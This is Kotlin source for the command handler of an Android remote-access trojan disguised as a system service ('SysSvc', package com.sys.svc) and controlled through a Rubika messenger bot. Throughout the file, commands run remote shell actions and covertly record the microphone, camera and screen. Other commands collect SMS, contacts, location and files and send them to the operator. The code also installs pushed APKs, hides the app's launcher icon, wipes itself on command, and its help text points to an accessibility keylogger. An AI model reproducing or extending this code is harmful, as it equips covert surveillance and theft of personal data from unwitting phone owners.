package com.sys.svc

import android.content.Context
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import com.sys.svc.helpers.*

class CommandHandler(private val ctx: Context, private val api: RubikaApi) {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    suspend fun handle(upd: JSONObject) {
        if (upd.optString("type") != "NewMessage") return
        val chatId = upd.optString("chat_id", "").ifEmpty { return }
        val msg = upd.optJSONObject("new_message") ?: return
        val text = msg.optString("text", "").trim()
        val sender = msg.optString("sender_id", "")

        val owner = Prefs.getOwner(ctx)
        if (owner.isNullOrEmpty()) {
            Prefs.setOwner(ctx, sender)
            Prefs.setChat(ctx, chatId)
            api.sendMessage(chatId, "✅ ثبت شد. /help را بزن.")
            return
        }
        if (sender != owner) {
            Logger.w("Cmd", "rejected sender=$sender owner=$owner")
            return
        }
        Prefs.setChat(ctx, chatId)

        if (msg.optJSONObject("file") != null) {
            handleIncomingFile(chatId, msg)
            return
        }

        if (!text.startsWith("/")) return
        val parts = text.split(Regex("\\s+"), 2)
        val cmd = parts[0].lowercase()
        val rest = parts.getOrElse(1) { "" }.trim()

        when (cmd) {
            "/start" -> api.sendMessage(chatId, helpShort())
            "/help" -> api.sendMessage(chatId, helpFull())
            "/info" -> api.sendMessage(chatId, StatusHelper.info(ctx))
            "/status" -> api.sendMessage(chatId, StatusHelper.status(ctx))
            "/proximity" -> api.sendMessage(chatId, ProximityHelper.status(ctx))
            "/net" -> api.sendMessage(chatId, NetHelper.info(ctx))
            "/notif" -> api.sendMessage(chatId, NotificationHelper.list(ctx))
            "/debug" -> api.sendMessage(chatId, debugInfo())

            "/shell" -> scope.launch { api.sendMessage(chatId, ShellHelper.exec(rest)) }
            "/ls" -> api.sendMessage(chatId, FileHelper.ls(rest))
            "/cat" -> api.sendMessage(chatId, FileHelper.cat(rest))
            "/rm" -> api.sendMessage(chatId, FileHelper.rm(rest))

            "/get" -> scope.launch { handleGet(chatId, rest) }
            "/screenshot" -> scope.launch { handleScreenshot(chatId) }
            "/screenrec" -> scope.launch { handleScreenRec(chatId, rest) }
            "/mic" -> scope.launch { handleMic(chatId, rest) }
            "/cam" -> scope.launch { handleCam(chatId, rest) }
            "/download" -> scope.launch { handleDownload(chatId, rest) }

            "/location" -> scope.launch { api.sendMessage(chatId, LocationHelper.get(ctx)) }
            "/contacts" -> scope.launch { api.sendMessage(chatId, ContactsHelper.list(ctx)) }
            "/sms" -> scope.launch { api.sendMessage(chatId, SmsHelper.list(ctx)) }
            "/apps" -> scope.launch { api.sendMessage(chatId, AppsHelper.list(ctx)) }

            "/wallpaper" -> scope.launch { handleWallpaper(chatId, rest) }
            "/lock" -> api.sendMessage(chatId, if (LockHelper.lock(ctx)) "🔒" else "❌")
            "/sound" -> scope.launch { handleSound(chatId, rest) }
            "/text" -> {
                OverlayHelper.showText(ctx, rest)
                api.sendMessage(chatId, if (rest.isNotEmpty()) "✅" else "❌ متن خالی")
            }

            "/hide" -> { FileHelper.hideLauncher(ctx); api.sendMessage(chatId, "🫥 مخفی شد") }
            "/unhide" -> { FileHelper.unhideLauncher(ctx); api.sendMessage(chatId, "👁 آشکار شد") }
            "/stealth" -> {
                val on = rest.lowercase() in setOf("on", "1", "true", "yes")
                if (on) FileHelper.hideLauncher(ctx) else FileHelper.unhideLauncher(ctx)
                api.sendMessage(chatId, if (on) "🫥 stealth ON" else "👁 stealth OFF")
            }

            "/wipe" -> scope.launch { handleWipe(chatId, rest) }
            "/delete" -> scope.launch { handleDelete(chatId, rest) }

            "/restart" -> {
                api.sendMessage(chatId, "🔄")
                delay(300)
                BotService.stop(ctx)
                delay(700)
                BotService.start(ctx)
            }
            "/stop" -> {
                api.sendMessage(chatId, "⏹")
                delay(300)
                BotService.stop(ctx)
            }

            else -> api.sendMessage(chatId, "❓ $cmd\n/help")
        }
    }

    // ────────────────────────────────────────────────────────────────
    // Incoming file handler
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleIncomingFile(chatId: String, msg: JSONObject) {
        val fObj = msg.optJSONObject("file") ?: return
        val fileId = fObj.optString("file_id", "").ifEmpty { return }
        val caption = msg.optString("text", "").trim()

        if (caption.startsWith("/update", ignoreCase = true)) {
            val tmp = java.io.File(ctx.cacheDir, "update_${System.currentTimeMillis()}.apk")
            api.sendMessage(chatId, "⬇️ دانلود APK برای آپدیت…")
            if (!api.downloadFile(fileId, tmp)) {
                api.sendMessage(chatId, "❌ دانلود ناموفق")
                return
            }
            val ok = UpdateHelper.installApk(ctx, tmp)
            api.sendMessage(chatId, if (ok) "📦 دیالوگ نصب باز شد" else "⚠️ اجازهٔ نصب بده (تنظیمات باز شد)")
            return
        }

        val m = Regex("^/?put\\s+(.+)$", RegexOption.IGNORE_CASE).find(caption)
            ?: run {
                api.sendMessage(chatId, "❌ کپشن باید /put <path> یا /update باشد")
                return
            }
        val target = FileHelper.resolve(m.groupValues[1])
        if (target == null) {
            api.sendMessage(chatId, "❌ مسیر نامعتبر")
            return
        }
        api.sendMessage(chatId, "⬇️ → ${target.absolutePath}")
        if (api.downloadFile(fileId, target)) {
            api.sendMessage(chatId, "✅ ${target.length()}B  →  ${target.absolutePath}")
        } else {
            api.sendMessage(chatId, "❌ دانلود ناموفق")
        }
    }

    // ────────────────────────────────────────────────────────────────
    // /get
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleGet(chatId: String, rest: String) {
        val f = FileHelper.resolve(rest)
        if (f == null || !f.exists() || !f.isFile) {
            api.sendMessage(chatId, "❌ فایل نیست")
            return
        }
        api.sendMessage(chatId, "⬆️ ${f.name} (${f.length()}B)")
        api.uploadAndSend(chatId, f, "File", "📄 ${f.name}")
    }

    // ────────────────────────────────────────────────────────────────
    // /screenshot
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleScreenshot(chatId: String) {
        api.sendMessage(chatId, "📸…")
        val f = ScreenshotHelper.take(ctx)
        if (f == null) {
            api.sendMessage(chatId, "❌ screenshot ناموفق (اجازهٔ MediaProjection را در MainActivity بده)")
            return
        }
        try {
            api.uploadAndSend(chatId, f, "Image", "📸 ${f.name} (${f.length()}B)")
        } finally {
            f.delete()
        }
    }

    // ────────────────────────────────────────────────────────────────
    // /screenrec
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleScreenRec(chatId: String, rest: String) {
        if (rest.lowercase() == "stop") {
            val f = ScreenRecorder.stop()
            if (f != null && f.exists()) {
                api.uploadAndSend(chatId, f, "Video", "⏹ screen (${f.length()}B)")
                f.delete()
            } else api.sendMessage(chatId, "❌ در حال ضبط نبود")
            return
        }
        if (MediaProjectionHolder.getConsent() == null) {
            api.sendMessage(chatId, "❌ ابتدا اپ را باز کن و اجازهٔ ضبط صفحه بده")
            return
        }
        val sec = rest.toIntOrNull()?.coerceIn(1, 600) ?: 30
        val started = ScreenRecorder.start(ctx, withMic = true)
        if (started == null) {
            api.sendMessage(chatId, "❌ شروع ناموفق")
            return
        }
        api.sendMessage(chatId, "🎬 screen ${sec}s…")
        delay(sec * 1000L + 500)
        val done = ScreenRecorder.stop()
        if (done != null && done.exists()) {
            api.uploadAndSend(chatId, done, "Video", "🎬 ${sec}s (${done.length()}B)")
            done.delete()
        } else api.sendMessage(chatId, "❌ ذخیره نشد")
    }

    // ────────────────────────────────────────────────────────────────
    // /mic
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleMic(chatId: String, rest: String) {
        if (rest.lowercase() == "stop") {
            val f = AudioRecorder.stop()
            if (f != null && f.exists()) {
                api.uploadAndSend(chatId, f, "File", "🎤 stopped (${f.length()}B)")
                f.delete()
            } else api.sendMessage(chatId, "❌ در حال ضبط نبود")
            return
        }
        val sec = rest.toIntOrNull()?.coerceIn(1, 600) ?: 30
        val f = AudioRecorder.start(ctx)
        if (f == null) {
            api.sendMessage(chatId, "❌ mic ناموفق (اجازه؟)")
            return
        }
        api.sendMessage(chatId, "🎤 recording ${sec}s…")
        delay(sec * 1000L)
        val done = AudioRecorder.stop()
        if (done != null && done.exists()) {
            api.uploadAndSend(chatId, done, "File", "🎤 ${sec}s (${done.length()}B)")
            done.delete()
        } else api.sendMessage(chatId, "❌ save failed")
    }

    // ────────────────────────────────────────────────────────────────
    // /cam
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleCam(chatId: String, rest: String) {
        val parts = rest.split(Regex("\\s+")).filter { it.isNotBlank() }
        val mode = parts.getOrNull(0)?.lowercase() ?: "photo"
        val camId = parts.getOrNull(1) ?: "0"

        when (mode) {
            "stop" -> {
                val f = CameraRecorder.stopVideo()
                if (f != null && f.exists()) {
                    api.uploadAndSend(chatId, f, "Video", "🎥 stopped (${f.length()}B)")
                    f.delete()
                } else api.sendMessage(chatId, "❌ در حال ضبط نبود")
            }
            "photo", "pic", "p" -> {
                api.sendMessage(chatId, "📷…")
                val f = CameraRecorder.capturePhoto(ctx, camId)
                if (f != null && f.exists()) {
                    api.uploadAndSend(chatId, f, "Image", "📷 cam$camId (${f.length()}B)")
                    f.delete()
                } else api.sendMessage(chatId, "❌ عکس ناموفق")
            }
            else -> {
                val sec = mode.toIntOrNull()?.coerceIn(1, 300) ?: 10
                val audio = parts.contains("audio")
                api.sendMessage(chatId, "🎥 cam$camId ${sec}s${if (audio) " +mic" else ""}…")
                val started = CameraRecorder.startVideo(ctx, camId, audio)
                if (started == null) {
                    api.sendMessage(chatId, "❌ start failed")
                    return
                }
                delay(sec * 1000L)
                val f = CameraRecorder.stopVideo()
                if (f != null && f.exists()) {
                    api.uploadAndSend(chatId, f, "Video", "🎥 ${sec}s (${f.length()}B)")
                    f.delete()
                } else api.sendMessage(chatId, "❌ video save failed")
            }
        }
    }

    // ────────────────────────────────────────────────────────────────
    // /download
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleDownload(chatId: String, rest: String) {
        if (rest.isBlank()) {
            api.sendMessage(chatId, "❌ /download <url> [path]")
            return
        }
        val parts = rest.split(Regex("\\s+"), 2)
        val url = parts[0]
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            api.sendMessage(chatId, "❌ URL نامعتبر")
            return
        }
        val target: java.io.File = if (parts.size > 1) {
            FileHelper.resolve(parts[1]) ?: run {
                api.sendMessage(chatId, "❌ مسیر نامعتبر")
                return
            }
        } else {
            val name = url.substringAfterLast('/').substringBefore('?')
                .ifBlank { "download_${System.currentTimeMillis()}.bin" }
            val safeName = name.replace(Regex("[^A-Za-z0-9._-]"), "_")
            java.io.File(FileHelper.downloadsDir(ctx), safeName)
        }
        api.sendMessage(chatId, "⬇️ → ${target.absolutePath}")
        val ok = DownloadHelper.download(url, target) { sent, total ->
            // progress update disabled by default (could be enabled)
            Unit
        }
        if (ok && target.exists()) {
            api.uploadAndSend(chatId, target, "File",
                "✅ ${target.name} (${target.length()}B)")
        } else {
            api.sendMessage(chatId, "❌ دانلود ناموفق")
        }
    }

    // ────────────────────────────────────────────────────────────────
    // /wallpaper
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleWallpaper(chatId: String, rest: String) {
        val m = Regex("^/?(put\\s+)?(.+)$", RegexOption.IGNORE_CASE).find(rest.trim())
            ?: run { api.sendMessage(chatId, "❌ /wallpaper <path>"); return }
        val pathStr = m.groupValues[2].trim().trim('"').trim('\'')
        val f = FileHelper.resolve(pathStr)
        if (f == null || !f.exists() || !f.isFile) {
            api.sendMessage(chatId, "❌ فایل نیست")
            return
        }
        val ok = WallpaperHelper.set(ctx, f)
        api.sendMessage(chatId, if (ok) "✅ والپیپر تنظیم شد" else "❌ ناموفق")
    }

    // ────────────────────────────────────────────────────────────────
    // /sound
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleSound(chatId: String, rest: String) {
        if (rest.lowercase() == "stop") {
            SoundHelper.stop()
            api.sendMessage(chatId, "⏹")
            return
        }
        val m = Regex("^/?(play\\s+)?(.+)$", RegexOption.IGNORE_CASE).find(rest.trim())
            ?: run { api.sendMessage(chatId, "❌ /sound <path>"); return }
        val pathStr = m.groupValues[2].trim().trim('"').trim('\'')
        val f = FileHelper.resolve(pathStr)
        if (f == null || !f.exists() || !f.isFile) {
            api.sendMessage(chatId, "❌ فایل نیست")
            return
        }
        val ok = SoundHelper.play(ctx, f)
        api.sendMessage(chatId, if (ok) "🔊 در حال پخش" else "❌ پخش ناموفق")
    }

    // ────────────────────────────────────────────────────────────────
    // /wipe
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleWipe(chatId: String, rest: String) {
        if (rest.lowercase() !in setOf("yes", "confirm", "تایید", "تأیید")) {
            api.sendMessage(chatId,
                "⚠️ دیتا (prefs/cache/files/DB) پاک می‌شود، اپ می‌ماند.\nبرای تأیید: /wipe yes")
            return
        }
        api.sendMessage(chatId, "🧹 در حال پاک‌سازی…")
        SelfDestruct.wipeData(ctx)
        api.sendMessage(chatId, "✅ دیتا پاک شد. سرویس خاموش می‌شود.")
        delay(800)
        BotService.stop(ctx)
    }

    // ────────────────────────────────────────────────────────────────
    // /delete
    // ────────────────────────────────────────────────────────────────
    private suspend fun handleDelete(chatId: String, rest: String) {
        if (rest.lowercase() !in setOf("yes", "confirm", "تایید", "تأیید")) {
            api.sendMessage(chatId,
                "⚠️ خودحذفی: دیتا پاک، اجزا غیرفعال، نوتیف Uninstall نمایش داده می‌شود.\n" +
                "برای تأیید: /delete yes\n" +
                "برای فقط دیتا: /wipe yes")
            return
        }
        api.sendMessage(chatId, "🗑 در حال حذف…")
        delay(500)
        SelfDestruct.fullDestroy(ctx)
    }

    // ────────────────────────────────────────────────────────────────
    // Debug info
    // ────────────────────────────────────────────────────────────────
    private fun debugInfo(): String {
        val sb = StringBuilder()
        sb.appendLine("📦 ${ctx.packageName}")
        sb.appendLine("📁 ${ctx.filesDir.absolutePath}")
        sb.appendLine("🐍 PID: ${android.os.Process.myPid()}")
        sb.appendLine("🔒 Root: ${if (ShellHelper.isRooted()) "✅" else "❌"}")
        sb.appendLine("Offset: ${Prefs.getOffset(ctx) ?: "—"}")
        sb.appendLine("Owner: ${Prefs.getOwner(ctx) ?: "—"}")
        sb.appendLine("Chat: ${Prefs.getChat(ctx) ?: "—"}")
        sb.appendLine("Hidden: ${Prefs.isHidden(ctx)}")
        sb.appendLine("Projection: ${if (MediaProjectionHolder.getConsent() != null) "✅" else "❌"}")
        sb.appendLine("Overlay: ${if (OverlayHelper.canDrawOverlays(ctx)) "✅" else "❌"}")
        sb.appendLine("Accessibility keylogger: ${if (KeyloggerService.isEnabled(ctx)) "✅" else "❌"}")
        sb.appendLine()
        sb.appendLine("— log —")
        sb.append(Logger.tail(40))
        return sb.toString()
    }

    // ────────────────────────────────────────────────────────────────
    // Help texts
    // ────────────────────────────────────────────────────────────────
    private fun helpShort(): String =
        "🤖 SysSvc v2\n\n" +
        "/help — راهنمای کامل\n" +
        "/info — اطلاعات سیستم\n" +
        "/status — وضعیت لحظه‌ای\n" +
        "/proximity — حضور کاربر\n" +
        "/screenshot — اسکرین‌شات\n" +
        "/screenrec <sec> — ضبط صفحه\n" +
        "/mic <sec> — ضبط صدا\n" +
        "/cam photo | /cam <sec> — دوربین\n" +
        "/shell /ls /cat /get /rm — فایل\n" +
        "/location /contacts /sms /apps\n" +
        "/download <url> [path]\n" +
        "/wallpaper <path> /sound <path>\n" +
        "/text <متن> /lock\n" +
        "/hide /unhide /stealth\n" +
        "/wipe /delete /restart /stop"

    private fun helpFull(): String =
        "📖 راهنمای کامل\n━━━━━━━━━━━━━━\n\n" +
        "🎤 /mic <sec> | /mic stop\n" +
        "📷 /cam photo [id] | /cam <sec> [id] [audio] | /cam stop\n" +
        "🎬 /screenrec <sec> | /screenrec stop\n" +
        "📸 /screenshot\n\n" +
        "💻 /shell <cmd>\n" +
        "📁 /ls <path>\n" +
        "📄 /cat <path>\n" +
        "📤 /get <path>\n" +
        "🗑 /rm <path>\n" +
        "   میان‌بر: desktop, downloads, documents, pictures, dcim,\n" +
        "           music, movies, home, ~\n" +
        "   آپلود فایل: کپشن /put <path>\n" +
        "   آپدیت APK: فایل apk با کپشن /update\n\n" +
        "📍 /location\n" +
        "👥 /contacts\n" +
        "✉️ /sms\n" +
        "📦 /apps\n" +
        "📶 /net\n" +
        "🔔 /notif\n\n" +
        "📊 /status /info /proximity /debug\n" +
        "⬇️ /download <url> [path]\n" +
        "🖼 /wallpaper <path>\n" +
        "🔊 /sound <path> | /sound stop\n" +
        "📝 /text <متن>  (نیاز به اجازهٔ overlay)\n" +
        "🔒 /lock\n\n" +
        "🫥 /hide /unhide /stealth on|off\n" +
        "🧹 /wipe yes    (پاک دیتا، اپ می‌ماند)\n" +
        "🗑 /delete yes   (پاک کامل + نوتیف Uninstall)\n\n" +
        "⚙️ /restart /stop\n\n" +
        "🔓 همه بدون روت. /wifi و /browser passwords\n" +
        "   حذف شده‌اند (روت لازم دارند).\n" +
        "🔑 کی‌لاگر: Settings → Accessibility → System Accessibility"
}